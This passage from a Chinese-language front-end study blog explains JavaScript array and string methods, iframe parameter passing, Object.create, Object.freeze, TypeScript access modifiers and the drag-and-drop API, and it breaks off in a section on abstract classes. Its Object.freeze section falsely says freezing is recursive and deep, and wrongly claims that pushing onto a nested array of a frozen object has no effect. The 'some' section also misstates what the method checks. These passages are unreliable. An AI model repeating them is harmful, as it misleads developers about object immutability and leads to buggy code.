<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //every">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.every(function (item) &#123;<br>    return item &gt; 0<br>&#125;)<br>console.log(res);//打印结果  true<br></code></pre></td></tr></table></figure>

<ol start="5">
<li>some（） 数组中有没有满足条件的</li>
</ol>
<p>语法: 数组名.some(function (item,index,arr) {})</p>
<ul>
<li>item : 这个表示的是数组中的每一项</li>
<li>index : 这个表示的是每一项对应的索引</li>
<li>arr : 这个表示的是原数组</li>
</ul>
<p>作用: 主要是用来判断数组中是不是 每一个 都满足条件</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">只有有一个满足条件返回的是<span class="hljs-literal">true</span><br><br> 只要都不满足返回的就是<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>

<p>返回值: 是一个布尔值</p>
<p>注意: 要以return的形式执行返回条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //some">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.some(function (item) &#123;<br>    return item &gt; 3<br>&#125;)<br>console.log(res);//true<br></code></pre></td></tr></table></figure>

<ol start="6">
<li>find（）用来获取数组中满足条件的第一个数据</li>
</ol>
<p>语法: 数组名.find(function (item,index,arr) {})</p>
<ul>
<li>item : 这个表示的是数组中的每一项</li>
<li>index : 这个表示的是每一项对应的索引</li>
<li>arr : 这个表示的是原数组</li>
</ul>
<p>作用: 用来获取数组中满足条件的数据</p>
<p>返回值: 如果有 就是满足条件的第一个数据；如果没有就是undefined</p>
<p>注意: 要以return的形式执行返回条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //find">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.find(function (item) &#123;<br>    return item &gt; 3<br>&#125;)<br>console.log(res)//4<br></code></pre></td></tr></table></figure>

<ol start="7">
<li>reduce（）叠加后的效果</li>
</ol>
<p>语法: 数组名.reduce(function (prev,item,index,arr) {},初始值)</p>
<ul>
<li>prev :一开始就是初始值 当第一次有了结果以后；这个值就是第一次的结果</li>
<li>item : 这个表示的是数组中的每一项</li>
<li>index : 这个表示的是每一项对应的索引</li>
<li>arr : 这个表示的是原数组</li>
</ul>
<p>作用: 就是用来叠加的</p>
<p>返回值: 就是叠加后的结果</p>
<p>注意: 以return的形式书写返回条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs //reduce">var arr = [1, 2, 3, 4, 5]<br>var res = arr.reduce(function (prev, item) &#123;<br>    return prev *= item<br>&#125;, 1)<br>console.log(res);//120<br></code></pre></td></tr></table></figure>

<h3 id="9、字符串方法总结"><a href="#9、字符串方法总结" class="headerlink" title="9、字符串方法总结"></a>9、字符串方法总结</h3><p>以下是 JavaScript 中常用的一些字符串方法，这些方法可用于处理和操作字符串：</p>
<ol>
<li><p><strong>字符串长度和基本操作</strong>：</p>
<ul>
<li><code>length</code>: 返回字符串的长度。</li>
<li><code>charAt(index)</code>: 返回指定位置的字符。</li>
<li><code>charCodeAt(index)</code>: 返回指定位置字符的 Unicode 编码。</li>
<li><code>concat(string1, string2, ...)</code>: 连接多个字符串并返回新字符串。</li>
<li><code>slice(start, end)</code>: 提取字符串的一部分。</li>
<li><code>substring(start, end)</code>: 提取字符串的一部分。</li>
<li><code>substr(start, length)</code>: 提取从指定位置开始的指定长度的子字符串。</li>
<li><code>indexOf(substring, start)</code>: 返回子字符串第一次出现的位置。</li>
<li><code>lastIndexOf(substring, start)</code>: 返回子字符串最后一次出现的位置。</li>
<li><code>startsWith(substring, start)</code>: 检查字符串是否以指定子字符串开头。</li>
<li><code>endsWith(substring, length)</code>: 检查字符串是否以指定子字符串结尾。</li>
</ul>
</li>
<li><p><strong>大小写转换</strong>：</p>
<ul>
<li><code>toUpperCase()</code>: 将字符串转换为大写。</li>
<li><code>toLowerCase()</code>: 将字符串转换为小写。</li>
</ul>
</li>
<li><p><strong>字符串替换和剪裁</strong>：</p>
<ul>
<li><code>replace(oldSubstring, newSubstring)</code>: 替换字符串中的子字符串。</li>
<li><code>trim()</code>: 去除字符串两端的空格。</li>
<li><code>trimStart()</code> 或 <code>trimLeft()</code>: 去除字符串开头的空格。</li>
<li><code>trimEnd()</code> 或 <code>trimRight()</code>: 去除字符串末尾的空格。</li>
</ul>
</li>
<li><p><strong>分割和连接字符串</strong>：</p>
<ul>
<li><code>split(separator, limit)</code>: 将字符串拆分为数组，根据指定的分隔符。</li>
<li><code>join(separator)</code>: 将数组元素连接成一个字符串，使用指定的分隔符。</li>
</ul>
</li>
<li><p><strong>提取字符或子字符串</strong>：</p>
<ul>
<li><code>substring(start, end)</code>: 提取字符串的一部分，类似于 <code>slice</code>。</li>
<li><code>substr(start, length)</code>: 提取从指定位置开始的指定长度的子字符串。</li>
</ul>
</li>
<li><p><strong>正则表达式</strong>：</p>
<ul>
<li><code>match(regexp)</code>: 在字符串中查找匹配正则表达式的子字符串。</li>
<li><code>search(regexp)</code>: 查找字符串中匹配正则表达式的位置。</li>
<li><code>replace(regexp, newSubstring)</code>: 使用正则表达式替换字符串中的匹配项。</li>
<li><code>split(regexp, limit)</code>: 使用正则表达式拆分字符串为数组。</li>
</ul>
</li>
<li><p><strong>其他方法</strong>：</p>
<ul>
<li><code>charAt(index)</code>: 返回指定位置的字符。</li>
<li><code>charCodeAt(index)</code>: 返回指定位置字符的 Unicode 编码。</li>
<li><code>includes(substring)</code>: 检查字符串是否包含指定子字符串。</li>
<li><code>repeat(count)</code>: 复制字符串指定次数。</li>
<li><code>localeCompare(compareString)</code>: 比较两个字符串并返回一个指示顺序的数字。</li>
<li><code>padStart(targetLength, padString)</code>: 在字符串的开头用指定字符填充。</li>
<li><code>padEnd(targetLength, padString)</code>: 在字符串的结尾用指定字符填充。</li>
</ul>
</li>
</ol>
<p>这些方法可以用于处理和操作字符串的各种需求，根据具体情况选择合适的方法来进行字符串操作。</p>
<h3 id="10、iframe传参"><a href="#10、iframe传参" class="headerlink" title="10、iframe传参"></a>10、iframe传参</h3><p>在前端开发中，通过 <code>&lt;iframe&gt;</code> 元素传递参数通常需要使用一些技巧，因为 <code>&lt;iframe&gt;</code> 自身并不直接支持参数传递。以下是一些常见的方法来实现通过 <code>&lt;iframe&gt;</code> 传递参数的方式：</p>
<p><strong>1. URL 查询参数：</strong> 通过在 <code>&lt;iframe&gt;</code> 的 <code>src</code> 属性中添加查询参数来传递参数。例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;iframe.html?param1=value1&amp;param2=value2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后，您可以在 <code>iframe.html</code> 中使用 JavaScript 来获取这些参数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);<br><span class="hljs-keyword">const</span> param1 = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;param1&quot;</span>);<br><span class="hljs-keyword">const</span> param2 = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;param2&quot;</span>);<br></code></pre></td></tr></table></figure>

<p><strong>2. postMessage：</strong> 使用 <code>window.postMessage</code> 方法可以跨域传递数据，这对于与 <code>&lt;iframe&gt;</code> 内部的文档通信非常有用。在父文档中：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);<br>iframe.<span class="hljs-property">contentWindow</span>.<span class="hljs-title function_">postMessage</span>(&#123;<span class="hljs-attr">param1</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-attr">param2</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;, <span class="hljs-string">&#x27;*&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>在 <code>&lt;iframe&gt;</code> 内部的文档中：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">origin</span> === <span class="hljs-string">&#x27;父文档的域名&#x27;</span>) &#123;<br>    <span class="hljs-keyword">const</span> data = event.<span class="hljs-property">data</span>;<br>    <span class="hljs-comment">// 处理传递过来的数据</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>请注意，<code>&#39;*&#39;</code> 表示允许从任何源发送消息。在实际应用中，应该更加安全地设置消息的来源。</p>
<p><strong>3. localStorage 或 sessionStorage：</strong> 您还可以使用浏览器的 <code>localStorage</code> 或 <code>sessionStorage</code> 存储数据，然后在 <code>&lt;iframe&gt;</code> 中读取：</p>
<p>在父文档中：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;param1&quot;</span>, <span class="hljs-string">&quot;value1&quot;</span>);<br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;param2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>在 <code>&lt;iframe&gt;</code> 内部的文档中：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> param1 = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;param1&quot;</span>);<br><span class="hljs-keyword">const</span> param2 = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;param2&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>这些方法都可以用来在 <code>&lt;iframe&gt;</code> 和其父文档之间传递参数，具体取决于您的需求和安全性要求。选择最适合您的情况的方法，并确保在跨域通信时采取适当的安全措施。</p>
<h3 id="11、Object-create-的使用场景"><a href="#11、Object-create-的使用场景" class="headerlink" title="11、Object.create()的使用场景"></a>11、Object.create()的使用场景</h3><p><code>Object.create()</code> 方法是JavaScript中用于创建新对象的方法。它的主要作用是创建一个新对象，并将该对象的原型（prototype）设置为传入的对象，从而实现原型继承。<code>Object.create()</code> 方法的使用场景包括：</p>
<ol>
<li><p><strong>原型继承：</strong> 最常见的用途是创建一个对象，使其继承另一个对象的属性和方法。这是JavaScript中实现原型继承的一种方式。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> parent = &#123;<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent);<br>child.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出 &quot;Hello!&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>对象克隆：</strong> 可以使用<code>Object.create()</code>方法创建一个与现有对象具有相同原型的新对象，从而创建对象的副本。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> originalObject = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> cloneObject = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(originalObject));<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(cloneObject, originalObject);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cloneObject); <span class="hljs-comment">// 包含与originalObject相同的属性</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>使用不同原型链：</strong> 您可以使用<code>Object.create()</code>方法创建具有不同原型链的对象，以实现对象之间的多继承或组合。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> parent1 = &#123;<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from parent1!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> parent2 = &#123;<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from parent2!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent1);<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(child, parent2);<br><br>child.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出 &quot;Hello from parent2!&quot;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>创建具有特定原型的空对象：</strong> 您可以创建一个空对象，并将其原型设置为<code>null</code>或其他自定义原型，以构建特定类型的对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> emptyObject = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 创建一个没有原型的空对象</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>总之，<code>Object.create()</code>方法的主要使用场景涵盖了原型继承、对象克隆、多继承或组合以及创建具有特定原型的空对象等情况。它是JavaScript中实现灵活对象创建和继承的重要工具之一。</p>
<h3 id="12、object-freeze原理？深层对象可以freeze吗？freeze-hook实现修改freeze住的字段？"><a href="#12、object-freeze原理？深层对象可以freeze吗？freeze-hook实现修改freeze住的字段？" class="headerlink" title="12、object.freeze原理？深层对象可以freeze吗？freeze hook实现修改freeze住的字段？"></a>12、object.freeze原理？深层对象可以freeze吗？freeze hook实现修改freeze住的字段？</h3><p><code>Object.freeze()</code> 是JavaScript中的一个方法，用于冻结对象，使其变得不可修改。冻结后的对象无法添加、删除或修改属性或属性的值。<code>Object.freeze()</code> 的原理如下：</p>
<ol>
<li><p>它递归遍历对象的属性，将每个属性的 writable 特性设置为 <code>false</code>，从而阻止修改属性的值。</p>
</li>
<li><p>如果属性的值本身是一个对象，<code>Object.freeze()</code> 也会递归冻结该对象，从而使整个对象变成不可修改的。</p>
</li>
<li><p>它还将 configurable 特性设置为 <code>false</code>，阻止删除属性和修改属性的特性。</p>
</li>
</ol>
<p>因此，一旦调用了 <code>Object.freeze()</code>，对象就会变成不可变的，无法再对其进行任何修改。</p>
<p>关于深层对象（嵌套对象）是否可以冻结，答案是可以的。<code>Object.freeze()</code> 会递归地冻结对象中的所有嵌套对象，使整个对象图变得不可修改。这意味着深层嵌套的对象、数组等也都会变得不可修改。</p>
<p>以下是一个示例，演示了如何使用 <code>Object.freeze()</code> 冻结深层对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> deepObject = &#123;<br>  <span class="hljs-attr">prop1</span>: <span class="hljs-string">&#x27;value1&#x27;</span>,<br>  <span class="hljs-attr">nestedObject</span>: &#123;<br>    <span class="hljs-attr">prop2</span>: <span class="hljs-string">&#x27;value2&#x27;</span>,<br>    <span class="hljs-attr">nestedArray</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>  &#125;<br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(deepObject);<br><br><span class="hljs-comment">// 尝试修改深层对象</span><br>deepObject.<span class="hljs-property">prop1</span> = <span class="hljs-string">&#x27;new value&#x27;</span>; <span class="hljs-comment">// 这不会生效，对象已经冻结</span><br>deepObject.<span class="hljs-property">nestedObject</span>.<span class="hljs-property">prop2</span> = <span class="hljs-string">&#x27;new value&#x27;</span>; <span class="hljs-comment">// 这也不会生效，嵌套对象已经冻结</span><br>deepObject.<span class="hljs-property">nestedObject</span>.<span class="hljs-property">nestedArray</span>.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>); <span class="hljs-comment">// 这不会生效，嵌套数组已经冻结</span><br></code></pre></td></tr></table></figure>

<p>关于 “freeze hook”（冻结钩子），JavaScript本身并没有提供直接的机制来修改已经冻结的对象。一旦对象被冻结，就无法再对其属性进行修改。要实现此类功能，您可能需要自行管理对象的变化，例如，可以在对象被冻结之前创建其可变的副本，然后对副本进行修改，而不是直接修改冻结的对象。这样可以确保原始冻结的对象保持不变。</p>
<h3 id="13、public-protected-private区别"><a href="#13、public-protected-private区别" class="headerlink" title="13、public protected private区别"></a>13、public protected private区别</h3><p><code>public</code>、<code>protected</code> 和 <code>private</code> 是面向对象编程中用于控制类成员（属性和方法）可见性和访问权限的访问修饰符。它们的主要区别在于谁可以访问这些成员：</p>
<ol>
<li><strong>public（公共）：</strong> 成员被声明为 <code>public</code> 时，可以被任何代码访问，包括类的内部和外部。这是默认的访问修饰符。</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">x</span>); <span class="hljs-comment">// 可以访问 x，因为它是公共的</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>protected（受保护的）：</strong> 成员被声明为 <code>protected</code> 时，只能被类的内部和派生类的内部访问，外部代码无法直接访问。</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">super</span>(x);<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">accessParentX</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>); <span class="hljs-comment">// 可以在子类中访问 x，因为它是受保护的</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> parent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parent</span>(<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parent.<span class="hljs-property">x</span>); <span class="hljs-comment">// 无法直接访问 x，因为它是受保护的</span><br><br><span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-number">10</span>);<br>child.<span class="hljs-title function_">accessParentX</span>(); <span class="hljs-comment">// 可以通过子类方法访问 x</span><br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>private（私有的）：</strong> 成员被声明为 <code>private</code> 时，只能被类的内部访问，外部代码和派生类都无法直接访问。</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">accessX</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>); <span class="hljs-comment">// 可以在类的内部访问 x，因为它是私有的</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">x</span>); <span class="hljs-comment">// 无法直接访问 x，因为它是私有的</span><br>obj.<span class="hljs-title function_">accessX</span>(); <span class="hljs-comment">// 可以通过公共方法访问 x</span><br></code></pre></td></tr></table></figure>

<p>总结：</p>
<ul>
<li><code>public</code> 成员可以在任何地方访问。</li>
<li><code>protected</code> 成员只能在类的内部和派生类的内部访问。</li>
<li><code>private</code> 成员只能在类的内部访问。</li>
</ul>
<p>这些访问修饰符有助于控制类成员的可见性和访问权限，从而增强了代码的封装性和安全性。</p>
<h3 id="14、drag-api原理"><a href="#14、drag-api原理" class="headerlink" title="14、drag api原理"></a>14、drag api原理</h3><p>拖放（Drag and Drop，简称DnD）API 是一组Web API，用于实现在Web应用程序中处理拖放操作的功能。它允许用户拖动页面上的元素（如文本、图像或文件）并将其放置到其他地方，这在创建交互性强的Web应用程序时非常有用。拖放API的原理如下：</p>
<ol>
<li><p><strong>事件处理：</strong> 拖放操作的核心是事件处理。在拖动元素时，会触发一系列与拖放相关的事件。常见的拖放事件包括：</p>
<ul>
<li><code>dragstart</code>：拖动操作开始时触发，通常在拖动源（源元素）上触发。</li>
<li><code>dragenter</code>：当拖动元素进入可放置目标时触发。</li>
<li><code>dragover</code>：当拖动元素在可放置目标上移动时触发。</li>
<li><code>dragleave</code>：当拖动元素离开可放置目标时触发。</li>
<li><code>drop</code>：当拖动元素放置到可放置目标上时触发。</li>
</ul>
</li>
<li><p><strong>数据传递：</strong> 拖放API允许在拖动操作中传递数据。通常，您可以将自定义数据（例如文本、URL或自定义对象）与拖动元素相关联，然后在 <code>dragstart</code> 事件中将这些数据存储在 <code>DataTransfer</code> 对象中。</p>
</li>
<li><p><strong>拖动效果：</strong> 在拖动操作期间，拖动源元素通常会显示某种拖动效果，如半透明的元素或拖动时的复制图标。这可以通过CSS和拖放API的 <code>effectAllowed</code> 和 <code>dropEffect</code> 属性来控制。</p>
</li>
<li><p><strong>放置操作：</strong> 当拖动元素放置到可放置目标上时，会触发 <code>drop</code> 事件。在 <code>drop</code> 事件处理程序中，您可以获取拖动操作中传递的数据，并执行相应的操作，如数据处理、元素移动等。</p>
</li>
<li><p><strong>取消默认行为：</strong> 默认情况下，浏览器会禁止将拖动的元素放置到不允许的目标上。您可以通过取消 <code>dragover</code> 和 <code>drop</code> 事件的默认行为来允许或禁止放置操作。</p>
</li>
<li><p><strong>拖动源和可放置目标的设置：</strong> 拖动操作的成功实现通常需要设置哪些元素可以拖动（拖动源）以及哪些元素可以接受被拖动的元素（可放置目标）。这通常涉及到设置元素的 <code>draggable</code> 和 <code>ondragover</code> 属性。</p>
</li>
</ol>
<p>总的来说，拖放API的原理涉及了事件处理、数据传递、拖动效果、放置操作和取消默认行为等方面。通过合理使用这些功能，开发者可以实现强大的拖放交互，提高Web应用程序的用户体验。</p>
<h3 id="15、ts中的抽象类和抽象方法"><a href="#15、ts中的抽象类和抽象方法" class="headerlink" title="15、ts中的抽象类和抽象方法"></a>15、ts中的抽象类和抽象方法</h3><p>在 TypeScript 中，您可以使用抽象类和抽象方法来定义抽象的类和方法，这些抽象类和方法需要在子类中实现。抽象类是一个不能被实例化的类，而抽象方法是一个在抽象类中定义但没有具体实现的方法。以下是关于如何在 TypeScript 中使用抽象类和抽象方法的示例和解释：</p>
<p><strong>定义抽象类：</strong> 抽象类用于定义一组相关的类的通用结构，但不能直接创建它的实例。要定义一个抽象类，您需要在类声明前面加上 <code>abstract</code> 关键字：</p>
